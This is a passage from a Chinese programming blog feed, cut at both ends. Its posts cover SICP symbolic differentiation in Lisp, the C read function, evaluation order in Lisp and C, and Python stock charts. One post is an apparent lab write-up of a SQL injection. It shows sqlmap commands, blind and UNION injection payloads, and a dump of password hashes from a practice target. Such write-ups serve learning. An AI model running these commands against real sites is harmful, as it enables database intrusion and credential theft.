class="line">(<span class="name">define</span> (<span class="name">sum</span>? x) <span class="comment">; 是否为和式</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">pair</span>? x) (<span class="name">eq</span>? (<span class="name">car</span> x) &#x27;+)))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">product</span>? x) <span class="comment">; 是否为乘公式</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">pair</span>? x) (<span class="name">eq</span>? (<span class="name">car</span> x) &#x27;*)))</span><br></pre></td></tr></table></figure><p>然后我们需要定义出结果的构造方法:  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">make-sum</span> a1 a2) (<span class="name">list</span> &#x27;+ a1 a2)) <span class="comment">; 构造和式</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">make-product</span> a1 a2) (<span class="name">list</span> &#x27;* a1 a2)) <span class="comment">; 构造乘式</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">addend</span> s) (<span class="name">cadr</span> s)) <span class="comment">; 获取加数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">augend</span> s) (<span class="name">caddr</span> s)) <span class="comment">; 获取被加数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">multiplier</span> p) (<span class="name">cadr</span> p)) <span class="comment">; 获取乘数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">multiplicand</span> p) (<span class="name">caddr</span> p)) <span class="comment">; 获取被乘数</span></span><br></pre></td></tr></table></figure><p>最后实现求导函数:  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">deriv</span> exp var)</span><br><span class="line">    (<span class="name">cond</span> ((<span class="name">number</span>? exp ) <span class="number">0</span>)</span><br><span class="line">          ((<span class="name">variable</span>? exp)</span><br><span class="line">            (<span class="name">if</span> (<span class="name">same-variable</span>? exp var) <span class="number">1</span> <span class="number">0</span>))</span><br><span class="line">          ((<span class="name">sum</span>? exp)</span><br><span class="line">            (<span class="name">make-sum</span> (<span class="name">deriv</span> (<span class="name">addend</span> exp) var)</span><br><span class="line">                     (<span class="name">deriv</span> (<span class="name">augend</span> exp) var)))</span><br><span class="line">          ((<span class="name">product</span>? exp)</span><br><span class="line">            (<span class="name">make-sum</span></span><br><span class="line">                (<span class="name">make-product</span> (<span class="name">multiplier</span> exp)</span><br><span class="line">                         (<span class="name">deriv</span> (<span class="name">multiplicand</span> exp) var))</span><br><span class="line">                (<span class="name">make-product</span> (<span class="name">deriv</span> (<span class="name">multiplier</span> exp) var)</span><br><span class="line">                         (<span class="name">multiplicand</span> exp))</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (<span class="name">else</span></span><br><span class="line">            (<span class="name">error</span> <span class="string">&quot;unknown expression type: &quot;</span> exp))</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>接下来我们可以测试一下:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (deriv <span class="string">&#x27;(* x 3) &#x27;</span>x)</span><br><span class="line">(+ (* x 0) (* 1 3))</span><br><span class="line">&gt; (deriv <span class="string">&#x27;(+ x y) &#x27;</span>x)</span><br><span class="line">(+ 1 0)</span><br></pre></td></tr></table></figure><p>复杂D都得:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (deriv <span class="string">&#x27;(* (* x y) (+ x 3)) &#x27;</span>x)</span><br><span class="line">(+ (* (* x y) (+ 1 0)) (* (+ (* x 0) (* 1 y)) (+ x 3)))</span><br></pre></td></tr></table></figure><p>当然, 这个求导程序还是一个朴素的实现, 还需要对结果进行化简, 但是它已经实现了最核心的部分了…  </p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dive into the C raed function. 深入c语言的 read 函数</title>
      <link href="/2021/01/23/c-lang/c_lang_read/"/>
      <url>/2021/01/23/c-lang/c_lang_read/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>我们都知道c语言是一门非常强大的语言, 这得益于佢对系统底层嘅完美封装，因此用c语言读取文件嘅效率非常高, 接下来我们来看看读取文件最基本嘅函数 – read</p><h1 id="read函数的定义"><a href="#read函数的定义" class="headerlink" title="read函数的定义"></a>read函数的定义</h1><p>我们来看一下read嘅定义:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">void</span> *buf,<span class="type">size_t</span> nbyte)</span></span><br></pre></td></tr></table></figure><p>调用该函数就会从fd中读取最多nbytes个字节到缓冲区buf中</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先我们看到第一个参数fd系int类型嘅, 当你打开文件时可以调用open函数返回值赋给fd:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(文件地址)</span><br><span class="line">read(fd, ...)</span><br></pre></td></tr></table></figure><p>当然我们也可以不打开文件, 我们使用STDIN_FILENO 可以建一个待读写嘅文件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(STDIN_FILENO, ...)</span><br></pre></td></tr></table></figure><p>实际上, <code>fd</code>指的就是文件描述符, 咁问题来了, 咩系”文件描述符”?</p><h1 id="文件描述符系咩"><a href="#文件描述符系咩" class="headerlink" title="文件描述符系咩?"></a>文件描述符系咩?</h1><p>我们可以把文件描述符理解成一个索引, 当调用read函数嘅时候, 系统内核会利用文件描述符（file descriptor）来访问文件. 而打开现存文件或新建文件时, 即系调用open函数后, 系统内核会返回一个文件描述符. </p><p>其实呢, 在操作系统内部对文件进行相关操作时，都可能会创建对应的文件描述符, 这不正正应证了那句名言<code>Linux 中一切都是文件</code>?</p><h1 id="模拟vim编辑器的输入模式"><a href="#模拟vim编辑器的输入模式" class="headerlink" title="模拟vim编辑器的输入模式"></a>模拟vim编辑器的输入模式</h1><p>接下来我们就能用c语言read写模拟vim嘅输入模式喇:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (read(STDIN_FILENO, &amp;c, <span class="number">1</span>) == <span class="number">1</span> &amp;&amp; c != <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就系个人对c语言文件读取的理解, 由于系个初学者(弱鸡)可能有D地方会有错误, 欢迎各位指出!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> clang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dive into the programming language. 在编程语言中计算过程是如何求值的?</title>
      <link href="/2021/01/04/how_to_eval_in_computer/"/>
      <url>/2021/01/04/how_to_eval_in_computer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备啃一本书&lt;&lt;计算机程序的构造与解释&gt;&gt;(国内简称sicp)。仅仅看了第一章前面两节，对计算过程又有了深刻的理解。书中用的语言是lisp，当我还在抱怨为什么不用当时流行的c时，读了几页就领悟了作者的用意: 人们常说”c生万物”， 没错，不过那仅仅是在语言的实现层面上说的，但在计算过程中, 我敢肯定: <strong>lisp生万物</strong>!</p><p>那么什么是计算过程呢? 在数学的角度，也许是一个证明的过程。但是在编程的角度，其实就是在研究一个程序求值的过程。</p><p>一个程序本质上就是在求值，在求值过程中，本质上就是将所有东西转化为两种最基本的东西–数据和运算符(实际上编译器的实现就是这个过程)。</p><h1 id="代换模型"><a href="#代换模型" class="headerlink" title="代换模型"></a>代换模型</h1><p>举个非常简单的例子：我们要编写个函数计算x^2 + y^2, c语言可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> square(x) x * x</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">square_sum</span><span class="params">(x, y)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> square(x) + square(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们调用square_sum(3, 4)会发生什么? 作者在书中抽象出了代换模型这种概念: 将square_sum的参数x和y代换为3和4，接着向下求值, 最后就会变为 3 ^ 3 + 4 ^ 4了.</p><p>用lisp更能容易发现这一过程:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">square</span> x) (<span class="name">*</span> x x))</span><br><span class="line">(<span class="name">define</span> (<span class="name">square_sum</span> x y) (<span class="name">+</span> (<span class="name">square</span> x) (<span class="name">square</span> y))</span><br></pre></td></tr></table></figure><p>调用后lisp后转化为:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(+ (* x x) (* y y))</span><br></pre></td></tr></table></figure><p>非常简单吧，但是这里提出一个问题了: </p><p>在调用函数时函数是先展开后求值(正则序)还是先求值后展开(应用序)呢? 首先，数学角度证明了这两种方法都能得出同样的结果。</p><h1 id="求值也有顺序之分"><a href="#求值也有顺序之分" class="headerlink" title="求值也有顺序之分"></a>求值也有顺序之分</h1><p>在lisp中， 我们先用过程抽象的方法自己定义一个if语句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(define (new-if predicate then-clause else-clause)</span><br><span class="line">  (cond (predicate then-clause)</span><br><span class="line">        (<span class="keyword">else</span> else-clause)))</span><br></pre></td></tr></table></figure><p>我们来测试一下lisp是正则序求值还是应用序求值:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(new-if <span class="comment">#t (display &quot;good&quot;) (display &quot;bad&quot;)))</span></span><br><span class="line">&gt; badgood</span><br></pre></td></tr></table></figure><p>上面的结果是 badgood, 也就是说明 lisp 会先求出函数参数中的值，在应用代换模型向下展开运算了，那么试下正常的 if 语句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">if</span> <span class="comment">#t (display &quot;good&quot;) (display &quot;bad&quot;))</span></span><br><span class="line">&gt; good</span><br></pre></td></tr></table></figure><p>那么就说明 if 不是用函数实现的吧(当然了，if 的底层只是个指令，函数却是一个堆栈结构)!</p><p>最后得出结论: lisp 求值过程是应用序的!!!</p><p>心血来潮，测试一下 c语言是不是也是应用序求值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">p</span><span class="params">()</span> &#123;<span class="keyword">return</span> p();&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, test(<span class="number">0</span>, p()));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先分析一下，如果 c 语言是应用序求值，那么在调用test的时候会先对参数求值, 注意到第二个参数是个死递归(没有出口的递归), 那么这个程序会一直运行没有结果。</p><p>测试了一下，果然没看到0输出!!! 看来c语言也是应用序求值! 最后再来看一下生成的汇编代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">p:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$32, %rsp</span><br><span class="line">callp</span><br><span class="line">addq$32, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">movl%ecx, 16(%rbp)</span><br><span class="line">movl%edx, 24(%rbp)</span><br><span class="line">cmpl$0, 16(%rbp)</span><br><span class="line">jne.L4</span><br><span class="line">movl$0, %eax</span><br><span class="line">jmp.L5</span><br><span class="line">.L4:</span><br><span class="line">movl24(%rbp), %eax</span><br><span class="line">.L5:</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.LC0:</span><br><span class="line">.ascii &quot;%d\0&quot;</span><br><span class="line">.text</span><br><span class="line">.globlmain</span><br><span class="line">.defmain;.scl2;.type32;.endef</span><br><span class="line">.seh_procmain</span><br><span class="line">main:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$32, %rsp</span><br><span class="line">call__main</span><br><span class="line">callp   ; 注意这里调用test先调用了参数中的 p</span><br><span class="line">movl%eax, %edx</span><br><span class="line">movl$0, %ecx</span><br><span class="line">calltest</span><br><span class="line">movl%eax, %edx</span><br><span class="line">leaq.LC0(%rip), %rcx</span><br><span class="line">callprintf</span><br><span class="line">movl$0, %eax</span><br><span class="line">addq$32, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>总结一下吧，我们先讨论了代换模型，最后又对求值顺序进行了探究。发现lisp和c都是应用序的。</p><p>那么有没有编程语言求值过程是正则序的呢? 我测试了几种常用的语言暂时还没发现。。。或许使用应用序隐藏着某种优点?</p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dont be a SQL boy. Let&#39;s be a hacker. 记录一次 sql 注入</title>
      <link href="/2020/07/22/sql_inject_mark/"/>
      <url>/2020/07/22/sql_inject_mark/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>靶机:<a href="http://219.153.49.228:42101/">http://219.153.49.228:42101/</a></p><p>第一步: 判断是否为注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2</span><br></pre></td></tr></table></figure><p>结果出来了，果然有漏洞:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 AND 1729=1729</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 AND (SELECT 4966 FROM (SELECT(SLEEP(5)))Skub)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-4567 UNION ALL SELECT NULL,NULL,CONCAT(0x7171767071,0x6e4d6358704a4767585255695747714242575366494e7a6563626f6b4572684650674676766d554f,0x716b787671),NULL-- -</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，获取数据库:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --dbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mozhe_Discuz_StormGroup</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure><p>接下来就是拖库操作了<br>第三步，查看当前程序所用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --current-db</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[22:29:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[22:29:54] [INFO] fetching current database</span><br><span class="line">current database: <span class="string">&#x27;mozhe_Discuz_StormGroup&#x27;</span></span><br></pre></td></tr></table></figure><p>再看一下当前用户:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --current-user</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[22:36:41] [INFO] fetching current user</span><br><span class="line">current user: <span class="string">&#x27;root@localhost&#x27;</span></span><br></pre></td></tr></table></figure><p>第四步, 列出指定数据库的所有表，<code>-D</code>来指定数据表:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --tables -D <span class="string">&quot;mozhe_Discuz_StormGroup&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">[2 tables]</span><br><span class="line">+-------------------+</span><br><span class="line">| StormGroup_member |</span><br><span class="line">| notice            |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p>第五步，读取表中的字段名称:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --tables -D mozhe_Discuz_StormGroup -T StormGroup_member --columns</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">Table: StormGroup_member</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| <span class="built_in">id</span>       | int(11)      |</span><br><span class="line">| name     | varchar(20)  |</span><br><span class="line">| password | varchar(255) |</span><br><span class="line">| status   | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>可以看到password就是我们想要的东西，最后来查询它:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 -D mozhe_Discuz_StormGroup --tables -C password --dump</span><br></pre></td></tr></table></figure><p>flag就被拿到了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">Table: StormGroup_member</span><br><span class="line">[2 entries]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 356f589a7df439f6f744ff19bb8092c0 |</span><br><span class="line">| b39fe7ddfdd7f0a66af7c1da837f210b |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get stocks data with python. 用python获得股票数据</title>
      <link href="/2020/04/03/draw_stock_map/"/>
      <url>/2020/04/03/draw_stock_map/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入第三方库</span></span><br><span class="line"><span class="keyword">import</span> pandas_datareader</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取现在的时间</span></span><br><span class="line"><span class="comment"># (2020, 3, 7, 10, 37, 13, 186885)</span></span><br><span class="line">end = datetime.datetime.now()</span><br><span class="line">start = datetime.datetime(end.year - <span class="number">1</span>,</span><br><span class="line">                          end.month,</span><br><span class="line">                          end.day)</span><br><span class="line"><span class="comment"># 获取阿里巴巴数据</span></span><br><span class="line">alibaba = pandas_datareader.data.DataReader(<span class="string">&#x27;BABA&#x27;</span>, <span class="string">&#x27;yahoo&#x27;</span>, start, end)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数据</span></span><br><span class="line"><span class="built_in">print</span>(alibaba)</span><br><span class="line"></span><br><span class="line">alibaba[<span class="string">&#x27;Adj Close&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line">alibaba[<span class="string">&#x27;Open&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line">alibaba[<span class="string">&#x27;High&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"><span class="comment"># 把图片show出来</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">                  High         Low  ...    Volume   Adj Close</span><br><span class="line">Date                                ...                      </span><br><span class="line">2019-03-06  185.589996  183.020004  ...  10009100  184.169998</span><br><span class="line">2019-03-07  181.800003  176.729996  ...  16488900  177.320007</span><br><span class="line">2019-03-08  175.350006  171.565002  ...  14674200  175.029999</span><br><span class="line">2019-03-11  181.720001  177.580002  ...  13764000  180.410004</span><br><span class="line">2019-03-12  182.179993  179.509995  ...   8660000  180.630005</span><br><span class="line">2019-03-13  182.535004  179.259995  ...   8868200  180.699997</span><br><span class="line">2019-03-14  180.820007  178.009995  ...   9272000  180.360001</span><br><span class="line">2019-03-15  181.449997  179.660004  ...  10844100  180.970001</span><br><span class="line">2019-03-18  182.889999  180.759995  ...   7847800  181.830002</span><br><span class="line">2019-03-19  183.360001  180.850006  ...  10238600  182.139999</span><br><span class="line">2019-03-20  181.949997  178.429993  ...  15901500  181.279999</span><br><span class="line">2019-03-21  181.729996  178.520004  ...   9754500  181.500000</span><br><span class="line">2019-03-22  180.479996  175.335999  ...  11688400  176.259995</span><br><span class="line">2019-03-25  178.899994  174.100006  ...   7511400  178.770004</span><br><span 